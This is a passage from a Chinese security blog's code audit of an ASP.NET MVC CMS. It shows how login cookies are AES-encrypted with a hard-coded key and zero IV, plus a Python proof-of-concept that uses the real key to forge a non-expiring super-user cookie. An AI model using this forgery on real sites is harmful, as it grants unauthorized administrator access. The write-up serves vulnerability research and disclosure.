+<figure class="highlight c# hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">string</span> claimstr = loginUserDto.ToJson();</span><br><span class="line">RequestHelper.SetCookie(claimstr);</span><br></pre></td></tr></table></figure>
+<figure class="highlight c# hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cliamsString = Encrypt.AesEncrypt(cliamsString);</span><br><span class="line">_context.Response.Cookies.Append(CookieClaim, cliamsString, <span class="hljs-keyword">new</span> CookieOptions()</span><br><span class="line">&#123;</span><br><span class="line">	...</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<p>感觉会出大问题，跟进到<code>AesEncrypt</code>方法，果然密钥硬编码，<code>IV</code>为16个<code>0</code>。</p>
+<figure class="highlight c# hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">byte</span>[] _iv;</span><br><span class="line"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">byte</span>[] Iv &#123;</span><br><span class="line">    <span class="hljs-keyword">get</span> &#123;</span><br><span class="line">        <span class="hljs-keyword">if</span> ( _iv == <span class="hljs-literal">null</span> ) &#123;</span><br><span class="line">            <span class="hljs-keyword">var</span> size = <span class="hljs-number">16</span>;</span><br><span class="line">            _iv = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[size];</span><br><span class="line">            <span class="hljs-keyword">for</span> ( <span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; size; i++ )</span><br><span class="line">                _iv[i] = <span class="hljs-number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="hljs-keyword">return</span> _iv;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">string</span> AesKey = <span class="hljs-string">"QaP1AF8utIarcBqdhYTZpVGbiNQ9M6IL"</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">string</span> <span class="hljs-title">AesEncrypt</span>(<span class="hljs-params"> <span class="hljs-keyword">string</span> <span class="hljs-keyword">value</span>, <span class="hljs-keyword">string</span> key, Encoding encoding </span>)</span> &#123;</span><br><span class="line">    <span class="hljs-keyword">if</span>( <span class="hljs-keyword">string</span>.IsNullOrWhiteSpace( <span class="hljs-keyword">value</span> ) || <span class="hljs-keyword">string</span>.IsNullOrWhiteSpace( key ) )</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-keyword">string</span>.Empty;</span><br><span class="line">    <span class="hljs-keyword">var</span> rijndaelManaged = CreateRijndaelManaged( key );</span><br><span class="line">    <span class="hljs-keyword">using</span> ( <span class="hljs-keyword">var</span> transform = rijndaelManaged.CreateEncryptor( rijndaelManaged.Key, rijndaelManaged.IV ) ) &#123;</span><br><span class="line">        <span class="hljs-keyword">return</span> GetEncryptResult( <span class="hljs-keyword">value</span>, encoding, transform );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="漏洞验证-4"><a href="#漏洞验证-4" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>验证漏洞直接写一个AES的加密脚本就行了，但是被python的编码给坑惨了，最终网上CV了一个python2版本的脚本。</p>
+<figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES</span><br><span class="line"><span class="hljs-keyword">from</span> pkcs7 <span class="hljs-keyword">import</span> PKCS7Encoder</span><br><span class="line"><span class="hljs-keyword">import</span> base64</span><br><span class="line"> </span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RijndaelEncryptor</span><span class="hljs-params">(object)</span>:</span></span><br><span class="line"> </span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self, key, iv, k=<span class="hljs-number">16</span>)</span>:</span></span><br><span class="line">        self.key = base64.b64decode(key)</span><br><span class="line">        self.iv = iv</span><br><span class="line">        self.k = k</span><br><span class="line"> </span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">encrypt</span><span class="hljs-params">(self, text)</span>:</span></span><br><span class="line">        key = self.key</span><br><span class="line">        iv = self.iv</span><br><span class="line">        aes = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">        pad_text = PKCS7Encoder().encode(text)</span><br><span class="line">        cipher_text = aes.encrypt(pad_text)</span><br><span class="line">        <span class="hljs-keyword">return</span> base64.b64encode(cipher_text)</span><br><span class="line"> </span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decrypt</span><span class="hljs-params">(self, text)</span>:</span></span><br><span class="line">        key = self.key</span><br><span class="line">        iv = self.iv</span><br><span class="line">        aes = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">        decode_text = base64.b64decode(text)</span><br><span class="line">        pad_text = aes.decrypt(decode_text)</span><br><span class="line">        <span class="hljs-keyword">return</span> PKCS7Encoder().decode(pad_text)</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:</span><br><span class="line">    ase = RijndaelEncryptor(<span class="hljs-string">'QaP1AF8utIarcBqdhYTZpVGbiNQ9M6IL'</span>,<span class="hljs-string">'\x00'</span>*<span class="hljs-number">16</span>)</span><br><span class="line">    userinfo = <span class="hljs-string">'&#123;"Id":"138030650765382","LoginName":"admin","UserName":"test","IsSuper":true,"Gender":0,"RoleId":"0","RoleName":null,"RoleCode":null,"DeptId":0,"DeptName":"","Phone":"18888888888","Email":"","Avatar":"/upfiles/heads/60dc36b5006066164021cbf6.png"&#125;'</span></span><br><span class="line">    enc = ase.encrypt(userinfo)</span><br><span class="line">    print(enc)</span><br></pre></td></tr></table></figure>
+<p>用户信息里没有验证Cookie时间的变量，所以不写这个脚本也可以，Cookie不会过期，而且理论上能用这个Cookie登录所有使用这个系统的网站。脚本生成一个用户名为test的Cookie，替换原来的Cookie，在后台主页就会显示当前用户为test。</p>
+<p><img src="/2021/07/09/基于ASP.NET_MVC的easycms的easy代码审计/屏幕截图 2021-07-08 222748.png" alt></p>
+<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>原本以为这篇文章能很快写完，但是前后也拖了两个星期。总的来说这个是不太难审计的CMS，虽然目录很多，看着很晕。从中也学到了不少东西，ASP.NET MVC的目录结构、VTemplate模板引擎。这个模板引擎在网上没看到有什么安全相关的文章，看了他的文档，发现他的导入dll库、执行SQL语句等功能挺有意思的，更多的玩法有待发掘。然后写了个漏洞验证的poc，虽然是利用很简单，也就点几下的事，但是还是得练练写poc的能力，代码扔到了<a href>github</a>上，依然是渣代码。最后，不想当安全研究员的安服仔不是好的安服仔，一步一个脚印，加油吧打工人。</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.twle.cn/l/yufei/aspnetcore/dotnet-aspnet-staticfile.html" target="_blank" rel="noopener">https://www.twle.cn/l/yufei/aspnetcore/dotnet-aspnet-staticfile.html</a></p>
+<p><a href="https://clement.notin.org/blog/2020/04/15/Server-Side-Template-Injection-(SSTI" target="_blank" rel="noopener">https://clement.notin.org/blog/2020/04/15/Server-Side-Template-Injection-(SSTI)-in-ASP.NET-Razor/</a>-in-ASP.NET-Razor/)</p>
+<p><a href="https://www.cnblogs.com/kingthy/archive/2009/08/17/net-vtemplate.html" target="_blank" rel="noopener">https://www.cnblogs.com/kingthy/archive/2009/08/17/net-vtemplate.html</a></p>
+<p><a href="https://www.cnblogs.com/kingthy/archive/2011/08/31/2161039.html" target="_blank" rel="noopener">https://www.cnblogs.com/kingthy/archive/2011/08/31/2161039.html</a></p>
+
+        </div>
+        
+            <ul class="post-copyright">
+            <li><strong>本文标题：</strong><a href="https://blog.play2win.top/2021/07/09/基于ASP.NET_MVC的easycms的easy代码审计/">基于ASP.NET MVC的easycms的easy代码审计</a></li>
+            <li><strong>本文作者：</strong><a href="https://blog.play2win.top">P1ay2win</a></li>
+            <li><strong>本文链接：</strong><a href="https://blog.play2win.top/2021/07/09/基于ASP.NET_MVC的easycms的easy代码审计/">https://blog.play2win.top/2021/07/09/基于ASP.NET_MVC的easycms的easy代码审计/</a></li>
+            <li><strong>发布时间：</strong>2021-07-09</li>
+            <li><strong>版权声明：</strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="external nofollow" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明出处！
+            </li>
+            </ul>
+        
+        
+        <div class="level is-size-7 is-uppercase">
+            <div class="level-start">
+                <div class="level-item">
+                    <span class="is-size-6 has-text-grey has-mr-7">#</span>
+                    <a class="has-link-grey -link" href="/tags/SSTI/">SSTI</a>, <a class="has-link-grey -link" href="/tags/XSS/">XSS</a>
+                </div>
+            </div>
+        </div>
+        
+        
+        
+    </div>
+</div>
+
+
+
+
+
+<div class="card card-transparent">
+    <div class="level post-navigation is-flex-wrap is-mobile">
+        
+        
+        <div class="level-end">
+            <a class="level level-item has-link-grey  article-nav-next" href="/2020/11/09/2020铁三第四赛区个人赛writeup/">
+                <span class="level-item">[PWN]2020铁三第四赛区个人赛writeup</span>
+                <i class="level-item fas fa-chevron-right"></i>
+            </a>
+        </div>
+        
+    </div>
+</div>
+
+
+
+<div class="card">
+    <div class="card-content">
+        <h3 class="title is-5 has-text-weight-normal">评论</h3>
+        
+<div id="comment-container"></div>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.4.1/dist/gitalk.css">
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1.4.1/dist/gitalk.min.js"></script>
+<script>
+    var gitalk = new Gitalk({
+        clientID: '372fb49f2243341bf93b',
+        clientSecret: 'b79da9cd60cecc3af662428f1daa6e01b1702d75',
+        id: '57334c281dad986a91e4f9897ab2b312',
+        repo: 'p1ay2win.github.io',
+        owner: 'p1ay2win',
+        admin: "p1ay2win",
+        createIssueManually: false,
+        distractionFreeMode: false
+    })
+    gitalk.render('comment-container')
+</script>
+
+    </div>
+</div>
+
+</div>
+                
+
+
+
+
+<div class="column is-4-tablet is-4-desktop is-3-widescreen  has-order-1 column-left ">
+    
+        
+<div class="card widget">
+    <div class="card-content">
+        <nav class="level">
+            <div class="level-item has-text-centered" style="flex-shrink: 1">
+                <div>
+                    
+                    <figure class="image is-128x128 has-mb-6">
+                        <img class="is-rounded" src="/images/header.png" alt="p1ay2win">
+                    </figure>
+                    
+                    <p class="is-size-4 is-block">
+                        p1ay2win
+                    </p>
+                    
+                    
+                    <p class="is-size-6 is-block">
+                        p1ay2win&#39;s blog
+                    </p>
+                    
+                    
+                    <p class="is-size-6 is-flex is-flex-center has-text-grey">
+                        <i class="fas fa-map-marker-alt has-mr-7"></i>
+                        <span>CN</span>
+                    </p>
+                    
+                </div>
+            </div>
+        </nav>
+        <nav class="level is-mobile">
+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        文章
+                    </p>
+                    <p class="title has-text-weight-normal">
+                        24
+                    </p>
+                </div>
+            </div>
+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        分类
+                    </p>
+                    <p class="title has-text-weight-normal">
+                        7
+                    </p>
+                </div>
+            </div>
+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        标签
+                    </p>
+                    <p class="title has-text-weight-normal">
+                        19
+                    </p>
+                </div>
+            </div>
+        </nav>
+        
+        <div class="level">
+            <a class="level-item button is-link is-rounded" href="https://p1ay2win.github.io" target="_blank">
+                关注我</a>
+        </div>
+        
+        
+        
+        <div class="level is-mobile">
+            
+            <a class="level-item button is-white is-marginless" target="_blank"
+                title="Github" href="https://p1ay2win.github.io">
+                
+                <i class="fab fa-github"></i>
+                
+            </a>
+            
+        </div>
+        
+    </div>
+</div>
+
+    
+        
+
+    <div class="card widget column-left is-sticky" id="toc">
+        <div class="card-content">
+            <div class="menu">
+                <h3 class="menu-label">
+                    目录
+                </h3>
+                <ul class="menu-list"><li>
+        <a class="is-flex" href="#前言">
+        <span class="has-mr-6">1</span>
+        <span>前言</span>
+        </a></li><li>
+        <a class="is-flex" href="#前期踩点">
+        <span class="has-mr-6">2</span>
+        <span>前期踩点</span>
+        </a></li><li>
+        <a class="is-flex" href="#后台存储型XSS">
+        <span class="has-mr-6">3</span>
+        <span>后台存储型XSS</span>
+        </a><ul class="menu-list"><li>
+        <a class="is-flex" href="#审计步骤">
+        <span class="has-mr-6">3.1</span>
+        <span>审计步骤</span>
+        </a></li><li>
+        <a class="is-flex" href="#漏洞验证">
+        <span class="has-mr-6">3.2</span>
+        <span>漏洞验证</span>
+        </a></li></ul></li><li>
+        <a class="is-flex" href="#任意文件上传">
+        <span class="has-mr-6">4</span>
+        <span>任意文件上传</span>
+        </a><ul class="menu-list"><li>
+        <a class="is-flex" href="#审计步骤-1">
+        <span class="has-mr-6">4.1</span>
+        <span>审计步骤</span>
+        </a></li><li>
+        <a class="is-flex" href="#漏洞验证-1">
+        <span class="has-mr-6">4.2</span>
+        <span>漏洞验证</span>
+        </a></li></ul></li><li>
+        <a class="is-flex" href="#VTemplate模板注入">
+        <span class="has-mr-6">5</span>
+        <span>VTemplate模板注入</span>
+        </a><ul class="menu-list"><li>
+        <a class="is-flex" href="#审计步骤-2">
+        <span class="has-mr-6">5.1</span>
+        <span>审计步骤</span>
+        </a></li><li>
+        <a class="is-flex" href="#漏洞验证-2">
+        <span class="has-mr-6">5.2</span>
+        <span>漏洞验证</span>
+        </a></li></ul></li><li>
+        <a class="is-flex" href="#任意文件写">
+        <span class="has-mr-6">6</span>
+        <span>任意文件写</span>
+        </a><ul class="menu-list"><li>
+        <a class="is-flex" href="#审计步骤-3">
+        <span class="has-mr-6">6.1</span>
+        <span>审计步骤</span>
+        </a></li><li>
+        <a class="is-flex" href="#漏洞验证-3">
+        <span class="has-mr-6">6.2</span>
+        <span>漏洞验证</span>
+        </a></li></ul></li><li>
+        <a class="is-flex" href="#任意用户cookie伪造">
+        <span class="has-mr-6">7</span>
+        <span>任意用户cookie伪造</span>
+        </a><ul class="menu-list"><li>
+        <a class="is-flex" href="#审计步骤-4">
+        <span class="has-mr-6">7.1</span>
+        <span>审计步骤</span>
+        </a></li><li>
+        <a class="is-flex" href="#漏洞验证-4">
+        <span class="has-mr-6">7.2</span>
+        <span>漏洞验证</span>
+        </a></li></ul></li><li>
+        <a class="is-flex" href="#后记">
+        <span class="has-mr-6">8</span>
+        <span>后记</span>
+        </a></li><li>
+        <a class="is-flex" href="#参考">
+        <span class="has-mr-6">9</span>
+        <span>参考</span>
+        </a></li></ul>
+            </div>
+        </div>
+    </div>
+
+
+    
+    
+        <div class="column-right-shadow is-hidden-widescreen ">
+        
+        </div>
+    
+</div>
+
+
+                
+
+            </div>
+        </div>
+    </section>
+    <footer class="footer">
+    <div class="container">
+        <div class="level">
+            <div class="level-start has-text-centered-mobile">
+                <a class="footer-logo is-block has-mb-6" href="/">
+                
+                    P1ay2win&#39;s blog
+                
+                </a>
+                <p class="is-size-7">
+                &copy; 2021 P1ay2win&nbsp;
+                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>访问量<span id="busuanzi_value_site_pv"></span>次  <i class="fa fa-user-md"></i>  访客数<span id="busuanzi_value_site_uv"></span>人<br>
+                Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & <a
+                        href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank">Icarus</a>
+                
+                </p>
+            </div>
+            <div class="level-end">
+            
+                <div class="field has-addons is-flex-center-mobile has-mt-5-mobile is-flex-wrap is-flex-middle">
+                
+                <p class="control">
+                    <a class="button is-white is-large" target="_blank" title="Creative Commons" href="https://creativecommons.org/">
+                        
+                        <i class="fab fa-creative-commons"></i>
+                        
+                    </a>
+                </p>
+                
+                <p class="control">
+                    <a class="button is-white is-large" target="_blank" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/">
+                        
+                        <i class="fab fa-creative-commons-by"></i>
+                        
+                    </a>
+                </p>
+                
+                <p class="control">
+                    <a class="button is-white is-large" target="_blank" title="Download on GitHub" href="https://p1ay2win.github.io">
+                        
+                        <i class="fab fa-github"></i>
+                        
+                    </a>
+                </p>
+                
+                </div>
+            
+            </div>
+        </div>
+    </div>
+</footer>
+
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script>
+<script>moment.locale("zh-CN");</script>
+
+<script>
+var IcarusThemeSettings = {
+    article: {
+        highlight: {
+            clipboard: true,
+            fold: 'unfolded'
+        }
+    }
+};
+</script>
+
+
+    <script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script>
+
+
+
+    
+    
+<script src="/js/animation.js"></script>
+
+    
+    
+<script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script>
+<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script>
+<script src="/js/gallery.js" defer></script>
+
+    
+    
+<div id="outdated">
+    <h6>Your browser is out-of-date!</h6>
+    <p>Update your browser to view this website correctly. <a id="btnUpdateBrowser" href="http://outdatedbrowser.com/">Update
+            my browser now </a></p>
+    <p class="last"><a href="#" id="btnCloseUpdateBrowser" title="Close">&times;</a></p>
+</div>
+<script src="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.js" defer></script>
+<script>
+    document.addEventListener("DOMContentLoaded", function () {
+        outdatedBrowser({
+            bgColor: '#f25648',
+            color: '#ffffff',
+            lowerThan: 'flex'
+        });
+    });
+</script>
+
+    
+    <script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.5/unpacked/MathJax.js?config=TeX-MML-AM_CHTML" defer></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    MathJax.Hub.Config({
+        'HTML-CSS': {
+            matchFontHeight: false
+        },
+        SVG: {
+            matchFontHeight: false
+        },
+        CommonHTML: {
+            matchFontHeight: false
+        },
+        tex2jax: {
+            inlineMath: [
+                ['$','$'],
+                ['\\(','\\)']
+            ]
+        }
+    });
+});
+</script>
+    
+    
+<a id="back-to-top" title="回到顶端" href="javascript:;">
+    <i class="fas fa-chevron-up"></i>
+</a>
+<script src="/js/back-to-top.js" defer></script>
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+
+<script src="/js/main.js" defer></script>
+
+    
+    <div class="searchbox ins-search">
+    <div class="searchbox-container ins-search-container">
+        <div class="searchbox-input-wrapper">
+            <input type="text" class="searchbox-input ins-search-input" placeholder="想要查找什么..." />
+            <span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="searchbox-result-wrapper ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+    (function (window) {
+        var INSIGHT_CONFIG = {
+            TRANSLATION: {
+                POSTS: '文章',
+                PAGES: '页面',
+                CATEGORIES: '分类',
+                TAGS: '标签',
+                UNTITLED: '(无标题)',
+            },
+            CONTENT_URL: '/content.json',
+        };
+        window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+    })(window);
+</script>
+<script src="/js/insight.js" defer></script>
+<link rel="stylesheet" href="/css/search.css">
+<link rel="stylesheet" href="/css/insight.css">
+    
+</body>
+</html>
